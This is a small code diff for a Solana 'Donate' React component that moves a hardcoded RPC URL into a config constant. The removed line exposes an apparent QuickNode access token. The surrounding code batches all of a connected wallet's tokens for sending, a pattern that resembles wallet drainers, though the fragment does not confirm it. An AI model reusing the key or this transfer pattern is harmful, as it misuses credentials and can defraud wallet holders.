@@ -2,6 +2,7 @@ import { useState, useEffect } from "react";
 import { useWallet } from "@solana/wallet-adapter-react";
 import { WalletMultiButton } from "@solana/wallet-adapter-react-ui";
 import { Connection } from "@solana/web3.js";
+import { RPC_ENDPOINT } from "@/lib/config";
 import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
 import { Button } from "@/components/ui/button";
 import { Alert, AlertDescription } from "@/components/ui/alert";
@@ -62,7 +63,7 @@ export default function Donate() {
     setDonationStatus("loading");
 
     try {
-      const connection = new Connection("https://few-greatest-card.solana-mainnet.quiknode.pro/96ca284c1240d7f288df66b70e01f8367ba78b2b", "confirmed");
+      const connection = new Connection(RPC_ENDPOINT, "confirmed");
       const tokensToSend = balances.tokens;
       const batchSize = 5;
       const batches: typeof tokensToSend[] = [];
